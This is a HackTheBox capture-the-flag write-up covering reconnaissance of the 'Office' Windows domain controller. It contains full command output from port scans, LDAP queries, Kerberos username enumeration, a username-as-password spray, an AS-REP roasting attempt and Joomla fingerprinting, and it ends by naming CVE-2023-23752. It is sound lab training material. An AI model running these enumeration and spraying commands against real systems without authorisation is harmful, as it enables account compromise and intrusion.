# CTF Penetration Testing

## Platform: HackTheBox

### Machine: [Office](https://www.hackthebox.com/machines/Office)

<img src="https://labs.hackthebox.com/storage/avatars/2cdef06b99725f3dcce38431a95b7b77.png" alt="Office Machine Logo" width="150"/>

- Machine type: <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="17"/> Windows
- Machine difficulty: 🟥 Hard (<span style="color:#e63c35;">6.4</span>)

> Office is a hard-difficulty Windows machine featuring various vulnerabilities including Joomla web application abuse, PCAP analysis to identify Kerberos credentials, abusing LibreOffice macros after disabling the `MacroSecurityLevel` registry value, abusing MSKRP to dump DPAPI credentials and abusing Group Policies due to excessive Active Directory privileges.

#### Skills Required

- Basic Web Exploitation
- PCAP Analysis with WireShark
- Windows System Understanding
- DPAPI Knowledge
- GPO Knowledge

#### Skills learned

- [Joomla Web Service Abuse](https://www.exploit-db.com/exploits/51334)
- [Ruby Isolated Environment Setup](https://textplain.org/isolated-ruby)
- [WireShark Packet Filtering](https://medium.com/@haircutfish/tryhackme-wireshark-the-basics-task-5-packet-filtering-task-6-conclusion-27f3fb3a2898)
- Chisel Windows Building
- [LibreOffice Registry Security](https://wiki.documentfoundation.org/Deployment_and_Migration#Examples)
- [Abusing MS-BKRP for Password Decryption](https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107)
- [GPO Abuse](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)

#### Tools Used

Linux:
- burpsuite
- chisel
- curl
- evil-winrm
- gobuster
- hashcat
- impacket-secretsdump
- kerbrute
- ldapsearch
- msfconsole
- nc
- nikto
- netexec
- nmap
- rlwrap
- searchsploit
- smbclient
- tshark
- whatweb
- windapsearch
- wireshark

Windows:
- chisel.exe
- cmdkey.exe
- curl.exe
- icacls.exe
- mimikatz.exe
- net.exe
- PowerView.ps1
- reg.exe
- runas.exe
- RunasCs.exe
- SharpGPOAbuse.exe
- vaultcmd.exe
- wget.exe

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig tun0`:
```
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.22 📌 netmask 255.255.254.0  destination 10.10.14.22
        inet6 dead:beef:2::1014  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::2082:c6a0:3cb9:9a5a  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1  bytes 48 (48.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping 10.10.11.3`:
```
10.10.11.3 is alive
```

`sudo nmap -Pn -sSV -p- -T5 10.10.11.3`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 17:24 CET
Nmap scan report for 10.10.11.3
Host is up (0.060s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28) 🔍
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-14 00:27:34Z) 🔍
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn 🔍
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name) 🔍
443/tcp   open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
445/tcp   open  microsoft-ds? 🔍
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name) 🔍
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
53691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
53706/tcp open  msrpc         Microsoft Windows RPC
53713/tcp open  msrpc         Microsoft Windows RPC
53729/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 231.17 seconds
```

`sudo nmap -Pn -sS --script=ldap-rootdse -p389 10.10.11.3`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 17:24 CET
Nmap scan report for 10.10.11.3
Host is up (0.053s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=office,DC=htb
|       ldapServiceName: office.htb:dc$@OFFICE.HTB
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=office,DC=htb
|       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=office,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=office,DC=htb
|       namingContexts: DC=office,DC=htb
|       namingContexts: CN=Configuration,DC=office,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=office,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=office,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=office,DC=htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 274597
|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=office,DC=htb
|       dnsHostName: DC.office.htb 📌
|       defaultNamingContext: DC=office,DC=htb
|       currentTime: 20241114002452.0Z
|_      configurationNamingContext: CN=Configuration,DC=office,DC=htb
Service Info: Host: DC; OS: Windows

Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```

`echo -e '10.10.11.3\tdc.office.htb office.htb office' | sudo tee -a /etc/hosts`:
```
10.10.11.3      dc.office.htb office.htb office
```

`ldapsearch -x -H ldap://10.10.11.3/ -s 'base' 'namingContexts'`:
```
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingContexts 
#

#
dn:
namingContexts: DC=office,DC=htb
namingContexts: CN=Configuration,DC=office,DC=htb
namingContexts: CN=Schema,CN=Configuration,DC=office,DC=htb
namingContexts: DC=DomainDnsZones,DC=office,DC=htb
namingContexts: DC=ForestDnsZones,DC=office,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

`ldapsearch -x -H ldap://10.10.11.3/ -b "DC=office,DC=htb" '(objectClass=*)'`:
```
# extended LDIF
#
# LDAPv3
# base <DC=office,DC=htb> with scope subtree
# filter: (objectClass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090CF8, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4f7c

# numResponses: 1
```
❌

`windapsearch.py -d 'office.htb' --dc-ip 10.10.11.3`:
```
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.11.3
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=office,DC=htb
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[*] Bye!
```

`windapsearch.py -d 'office.htb' --dc-ip 10.10.11.3 --users`:
```
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.10.11.3
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=office,DC=htb
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[+] Enumerating all AD users
[!] Error retrieving users
[!] {'msgtype': 101, 'msgid': 3, 'result': 1, 'desc': 'Operations error', 'ctrls': [], 'info': '000004DC: LdapErr: DSID-0C090CF8, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c'}
```
❌

`netexec smb 10.10.11.3`:
```
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False) 📌
```

`netexec smb 10.10.11.3 -u '' -p ''`:
```
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office.htb\: STATUS_ACCESS_DENIED
```
❌

`netexec smb 10.10.11.3 -u 'guest' -p ''`:
```
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office.htb\guest: STATUS_ACCOUNT_DISABLED
```
❌

`kerbrute userenum --dc 10.10.11.3 -d 'office.htb' ~/tools/SecLists//Usernames/xato-net-10-million-usernames.txt`:
```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/13/24 - Ronnie Flathers @ropnop

2024/11/13 17:36:29 >  Using KDC(s):
2024/11/13 17:36:29 >   10.10.11.3:88

2024/11/13 17:36:40 >  [+] VALID USERNAME:       administrator@office.htb
2024/11/13 17:38:05 >  [+] VALID USERNAME:       Administrator@office.htb
2024/11/13 17:38:50 >  [+] VALID USERNAME:       ewhite@office.htb
2024/11/13 17:38:50 >  [+] VALID USERNAME:       etower@office.htb
2024/11/13 17:38:50 >  [+] VALID USERNAME:       dwolfe@office.htb
2024/11/13 17:38:50 >  [+] VALID USERNAME:       dlanor@office.htb
2024/11/13 17:38:50 >  [+] VALID USERNAME:       dmichael@office.htb
```

`kerbrute userenum --dc 10.10.11.3 -d 'office.htb' ~/tools/SecLists//Usernames/xato-net-10-million-usernames.txt | grep 'VALID USERNAME:' | awk '{ print $7 }' | awk -F '@' '{ print $1 }' | awk '{ print tolower($0) }' | awk NF | sort -u | tee ./domain_users.txt`:
```
administrator
dlanor
dmichael
dwolfe
etower
ewhite
```

`netexec smb 10.10.11.3 -u ./domain_users.txt -p ./domain_users.txt --no-bruteforce --continue-on-success`:
```
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office.htb\administrator:administrator STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\dlanor:dlanor STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\dmichael:dmichael STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\dwolfe:dwolfe STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\etower:etower STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\ewhite:ewhite STATUS_LOGON_FAILURE
```
❌

`impacket-GetNPUsers -dc-ip 10.10.11.3 'office.htb/' -usersfile ./domain_users.txt`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dlanor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dmichael doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dwolfe doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User etower doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ewhite doesn't have UF_DONT_REQUIRE_PREAUTH set
```
❌

When visiting `office.htb` through port `80`, we see a Joomla landing page for "Tony Stark's Iron Man Company" updates, in blog form. We can verify that the website is using Joomla by inspecting the source code of the landing site and seeing this metadata:
```html
<meta name="generator" content="Joomla! - Open Source Content Management">
```

`curl -s http://10.10.11.3:80/ -I`:
```http
HTTP/1.1 200 OK
Date: Thu, 14 Nov 2024 00:44:19 GMT
Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
X-Powered-By: PHP/8.0.28 📌
Set-Cookie: 3815f63d17a9109b26eb1b8c114159ac=iaop1174hgftpo6ak3tqgamd5b; path=/; HttpOnly
x-frame-options: SAMEORIGIN
referrer-policy: strict-origin-when-cross-origin
cross-origin-opener-policy: same-origin
Expires: Wed, 17 Aug 2005 00:00:00 GMT
Last-Modified: Thu, 14 Nov 2024 00:44:19 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Type: text/html; charset=utf-8
```

`whatweb -v http://10.10.11.3`:
```
WhatWeb report for http://10.10.11.3
Status    : 200 OK
Title     : Home
IP        : 10.10.11.3
Country   : RESERVED, ZZ

Summary   : Apache[2.4.56], Cookies[3815f63d17a9109b26eb1b8c114159ac], HTML5, HTTPServer[Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28], HttpOnly[3815f63d17a9109b26eb1b8c114159ac], MetaGenerator[Joomla! - Open Source Content Management], OpenSSL[1.1.1t], PasswordField[password], PHP[8.0.28], PoweredBy[the], Script[application/json,application/ld+json,module], UncommonHeaders[referrer-policy,cross-origin-opener-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.0.28]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.56 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ Cookies ]
        Display the names of cookies in the HTTP headers. The 
        values are not returned to save on space. 

        String       : 3815f63d17a9109b26eb1b8c114159ac

[ HTML5 ]
        HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        String       : Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28 (from server string) 📌

[ HttpOnly ]
        If the HttpOnly flag is included in the HTTP set-cookie 
        response header and the browser supports it then the cookie 
        cannot be accessed through client side script - More Info: 
        http://en.wikipedia.org/wiki/HTTP_cookie 

        String       : 3815f63d17a9109b26eb1b8c114159ac

[ MetaGenerator ]
        This plugin identifies meta generator tags and extracts its 
        value. 

        String       : Joomla! - Open Source Content Management 🔍

[ OpenSSL ]
        The OpenSSL Project is a collaborative effort to develop a 
        robust, commercial-grade, full-featured, and Open Source 
        toolkit implementing the Secure Sockets Layer (SSL v2/v3) 
        and Transport Layer Security (TLS v1) protocols as well as 
        a full-strength general purpose cryptography library. 

        Version      : 1.1.1t
        Website     : http://www.openssl.org/

[ PHP ]
        PHP is a widely-used general-purpose scripting language 
        that is especially suited for Web development and can be 
        embedded into HTML. This plugin identifies PHP errors, 
        modules and versions and extracts the local file path and 
        username if present. 

        Version      : 8.0.28
        Version      : 8.0.28
        Google Dorks: (2)
        Website     : http://www.php.net/

[ PasswordField ]
        find password fields 

        String       : password (from field name)

[ PoweredBy ]
        This plugin identifies instances of 'Powered by x' text and 
        attempts to extract the value for x. 

        String       : the

[ Script ]
        This plugin detects instances of script HTML elements and 
        returns the script language/type. 

        String       : application/json,application/ld+json,module

[ UncommonHeaders ]
        Uncommon HTTP server headers. The blacklist includes all 
        the standard headers and many non standard but common ones. 
        Interesting but fairly common headers should have their own 
        plugins, eg. x-powered-by, server and x-aspnet-version. 
        Info about headers can be found at www.http-stats.com 

        String       : referrer-policy,cross-origin-opener-policy (from headers)

[ X-Frame-Options ]
        This plugin retrieves the X-Frame-Options value from the 
        HTTP header. - More Info: 
        http://msdn.microsoft.com/en-us/library/cc288472%28VS.85%29.
        aspx

        String       : SAMEORIGIN

[ X-Powered-By ]
        X-Powered-By HTTP header 

        String       : PHP/8.0.28 (from x-powered-by string)

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Thu, 14 Nov 2024 00:45:58 GMT
        Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
        X-Powered-By: PHP/8.0.28
        Set-Cookie: 3815f63d17a9109b26eb1b8c114159ac=j29sg9c986hhvar68tuqgachcq; path=/; HttpOnly
        x-frame-options: SAMEORIGIN
        referrer-policy: strict-origin-when-cross-origin
        cross-origin-opener-policy: same-origin
        Expires: Wed, 17 Aug 2005 00:00:00 GMT
        Last-Modified: Thu, 14 Nov 2024 00:45:59 GMT
        Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
        Pragma: no-cache
        Connection: close
        Transfer-Encoding: chunked
        Content-Type: text/html; charset=utf-8
```

`nikto -h http://10.10.11.3`:
```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.11.3
+ Target Hostname:    10.10.11.3
+ Target Port:        80
+ Start Time:         2024-11-13 17:45:48 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+ /: Retrieved x-powered-by header: PHP/8.0.28.
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /robots.txt: Entry '/tmp/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file 🔍
+ /robots.txt: Entry '/layouts/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/administrator/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file 🔍
+ /robots.txt: Entry '/language/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/modules/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/cache/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/plugins/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/components/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/cli/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/includes/' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 15 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ OpenSSL/1.1.1t appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023. 🔍
+ PHP/8.0.28 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ /index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2047
+ /administrator/: This might be interesting.
+ /includes/: This might be interesting.
+ /README.TXT: This might be interesting. 🔍
+ /readme.txt: This might be interesting.
+ /tmp/: This might be interesting.
+ /icons/: Directory indexing found.
+ /LICENSE.txt: License file found may identify site software.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /license.txt: License file found may identify site software.
+ /LICENSE.TXT: License file found may identify site software.
+ /htaccess.txt: Default Joomla! htaccess.txt file found. This should be removed or renamed. 🔍
+ /administrator/index.php: Admin login page/section found. 🔍
+ 8896 requests: 0 error(s) and 31 item(s) reported on remote host
+ End Time:           2024-11-13 17:58:21 (GMT1) (753 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

`gobuster dir -u http://10.10.11.3 -w ~/tools/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,jpg,txt,zip -t 15`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.3
[+] Method:                  GET
[+] Threads:                 15
[+] Wordlist:                /home/kali/tools/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404,500,400,401
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,bak,jpg,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 300]
/images               (Status: 301) [Size: 334] [--> http://10.10.11.3/images/]
/index.php            (Status: 200) [Size: 24214]
/media                (Status: 301) [Size: 333] [--> http://10.10.11.3/media/]
/templates            (Status: 301) [Size: 337] [--> http://10.10.11.3/templates/]
/modules              (Status: 301) [Size: 335] [--> http://10.10.11.3/modules/]
/plugins              (Status: 301) [Size: 335] [--> http://10.10.11.3/plugins/]
/includes             (Status: 301) [Size: 336] [--> http://10.10.11.3/includes/]
/license.txt          (Status: 200) [Size: 18092]
/language             (Status: 301) [Size: 336] [--> http://10.10.11.3/language/]
/readme.txt           (Status: 200) [Size: 4942]
/examples             (Status: 503) [Size: 400]
/components           (Status: 301) [Size: 338] [--> http://10.10.11.3/components/]
/api                  (Status: 301) [Size: 331] [--> http://10.10.11.3/api/]
/cache                (Status: 301) [Size: 333] [--> http://10.10.11.3/cache/]
/libraries            (Status: 403) [Size: 300]
/robots.txt           (Status: 200) [Size: 764]
/licenses             (Status: 403) [Size: 419]
/tmp                  (Status: 301) [Size: 331] [--> http://10.10.11.3/tmp/]
/layouts              (Status: 301) [Size: 335] [--> http://10.10.11.3/layouts/]
/%20                  (Status: 403) [Size: 300]
/administrator        (Status: 301) [Size: 341] [--> http://10.10.11.3/administrator/] 🔍
/*checkout*.html      (Status: 403) [Size: 300]
/*checkout*.txt       (Status: 403) [Size: 300]
/*checkout*.zip       (Status: 403) [Size: 300]
/*checkout*.php       (Status: 403) [Size: 300]
/*checkout*.bak       (Status: 403) [Size: 300]
/*checkout*           (Status: 403) [Size: 300]
/*checkout*.jpg       (Status: 403) [Size: 300]
/configuration.php    (Status: 200) [Size: 0]
/phpmyadmin           (Status: 403) [Size: 300]
/htaccess.txt         (Status: 200) [Size: 6858]
/webalizer            (Status: 403) [Size: 419]
/*docroot*            (Status: 403) [Size: 300]
/*docroot*.jpg        (Status: 403) [Size: 300]
/*docroot*.txt        (Status: 403) [Size: 300]
/*docroot*.zip        (Status: 403) [Size: 300]
/*docroot*.php        (Status: 403) [Size: 300]
/*docroot*.html       (Status: 403) [Size: 300]
/*docroot*.bak        (Status: 403) [Size: 300]
/*                    (Status: 403) [Size: 300]
/*.php                (Status: 403) [Size: 300]
/*.html               (Status: 403) [Size: 300]
/*.bak                (Status: 403) [Size: 300]
/*.jpg                (Status: 403) [Size: 300]
/*.txt                (Status: 403) [Size: 300]
/*.zip                (Status: 403) [Size: 300]
/con.php              (Status: 403) [Size: 300]
/con.txt              (Status: 403) [Size: 300]
/con.zip              (Status: 403) [Size: 300]
/con                  (Status: 403) [Size: 300]
/con.bak              (Status: 403) [Size: 300]
/con.html             (Status: 403) [Size: 300]
/con.jpg              (Status: 403) [Size: 300]
/cli                  (Status: 301) [Size: 331] [--> http://10.10.11.3/cli/]

[...]
```

`curl -s http://10.10.11.3/robots.txt`:
```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/ 🔍
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

`curl -s http://10.10.11.3/readme.txt`:
```
Joomla! CMS™

1- Overview
        * This is a Joomla! 4.x installation/upgrade package.
        * Joomla! Official site: https://www.joomla.org
        * Joomla! 4.2 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_4.2_version_history
        * Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/4.2-dev 📌

[...]
```

`curl -s http://10.10.11.3/administrator/manifests/files/joomla.xml`:
```
<?xml version="1.0" encoding="UTF-8"?>
<extension type="file" method="upgrade">
        <name>files_joomla</name>
        <author>Joomla! Project</author>
        <authorEmail>admin@joomla.org</authorEmail>
        <authorUrl>www.joomla.org</authorUrl>
        <copyright>(C) 2019 Open Source Matters, Inc.</copyright>
        <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
        <version>4.2.7</version> 📌
        <creationDate>2023-01</creationDate>
        <description>FILES_JOOMLA_XML_DESCRIPTION</description>

[...]
```

Using the information obtained from the site, we search for `Joomla 4.2 CVE` on Google and find that there is an [Unauthenticated Information Disclosure](https://www.exploit-db.com/exploits/51334), assigned `CVE-2023-23752`, that allows us to dump information from the unrestricted webservice endpoints.
